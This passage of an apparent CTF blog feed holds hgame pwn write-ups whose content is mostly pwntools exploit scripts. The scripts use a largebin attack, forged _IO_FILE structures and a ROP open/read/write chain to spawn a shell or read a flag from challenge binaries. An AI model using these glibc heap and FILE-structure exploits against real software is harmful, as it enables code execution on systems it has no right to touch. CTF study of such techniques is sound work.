fake_IO_file)<br><br>flag_addr = heap + <span class="hljs-number">0x7d0</span> + <span class="hljs-number">0x200</span><br>data = heap + <span class="hljs-number">0x7d0</span> + <span class="hljs-number">0x300</span><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    flag_addr,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret<br>]<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0xa0</span>: [heap + <span class="hljs-number">0x7c0</span> + <span class="hljs-number">0x110</span>, ret],<br>        <span class="hljs-number">0x100</span>: rop_data,<br>        <span class="hljs-number">0x200</span>: <span class="hljs-string">&#x27;flag\x00\x00\x00\x00&#x27;</span><br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>,<br>)<br><br><br>edit(<span class="hljs-number">1</span>, payload)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b _IO_flush_all_lockp&#x27;)</span><br><span class="hljs-comment"># pause()</span><br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="4nswer-s-gift"><a href="#4nswer-s-gift" class="headerlink" title="4nswer_s_gift"></a>4nswer_s_gift</h2><p>白给的libc地址，同时我们可以直接覆盖_IO_list_all，明显打IO了。但是无法泄漏堆地址，这个地方卡了好久。最后想到了mmap，malloc一块大空间，使用mmap分配，其地址与libc地址偏移一定，从而得到heap地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30404</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect, _IO_list_all<br>    <span class="hljs-keyword">global</span> _IO_stdfile_2_lock, _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a10</span><br>    _IO_file_jumps = libc_base + <span class="hljs-number">0x1f35e0</span><br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f30a0</span><br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x2163c0</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;binsh: &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *0x7ffff7e44379&#x27;)</span><br><span class="hljs-comment"># pause()</span><br><br>ru(<span class="hljs-string">&#x27;it looks like this: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f7660</span><br><br>get_gadgets(libc_base)<br><br>gadgets = [<span class="hljs-number">0x4e0b0</span>, <span class="hljs-number">0xe3f59</span>, <span class="hljs-number">0xe3fb3</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">2</span>]<br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>, one_gadget)<br><br>heap_base = libc_base - <span class="hljs-number">0x204000</span><br>fake_IO_file_addr = heap_base + <span class="hljs-number">0x10</span><br><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data -&gt; _IO_write_base = rcx != 0</span><br>fake_IO_FILE +=p64(fake_IO_file_addr)<span class="hljs-comment"># fp-&gt;_IO_backup_base = rdxwide_data -&gt; _IO_write_ptr</span><br>fake_IO_FILE +=p64(system)<span class="hljs-comment"># fp-&gt;_IO_save_end = call addr(call setcontext)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _lock = writable address / _IO_stdfile_2_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_IO_file_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data, rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode != 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wfile_jumps + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># vtable0xd0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x110</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_IO_file_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addrfake_IO_wide_jumps</span><br><br>payload = fake_IO_FILE<br><br>ru(<span class="hljs-string">&#x27;many things do you think is appropriate to put into the gift?&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200000</span>))<br><br>ru(<span class="hljs-string">&#x27;put into the gitf?&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week3</title>
    <link href="/2023/02/06/2022-hgame-week3/"/>
    <url>/2023/02/06/2022-hgame-week3/</url>
    
    <content type="html"><![CDATA[<h2 id="hgame-week3-PWN"><a href="#hgame-week3-PWN" class="headerlink" title="hgame week3 PWN"></a>hgame week3 PWN</h2><h3 id="large-note"><a href="#large-note" class="headerlink" title="large note"></a>large note</h3><p><strong>largebin attack + house of obstack</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e4030</span><br>get_gadgets(libc_base)<br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = p64(leak) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xce0</span><br>fake_IO_addr = fake_IO_file_addr<br><br>fake_IO_file = flat(<br>    &#123;<br>        <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>        <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>        <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>        <span class="hljs-number">0x28</span>: system,<span class="hljs-comment"># gadget</span><br>        <span class="hljs-number">0x38</span>: fake_IO_addr + <span class="hljs-number">0xe8</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>        <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>        <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>        <span class="hljs-number">0x90</span>: _IO_wide_data_1,<span class="hljs-comment"># _IO_wide_data_2</span><br>        <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0xd0</span>: fake_IO_addr<span class="hljs-comment"># obstack(B)</span><br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>payload = fake_IO_file + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="note-content"><a href="#note-content" class="headerlink" title="note content"></a>note content</h3><p>跟上面的题一模一样，就是开了一个沙盒。</p><p>借助：一个特殊的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># &lt;getkeyserv_handle+576&gt;<br>mov rdx, qword ptr [rdi + 8]; <br>mov qword ptr [rsp], rax; <br>call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 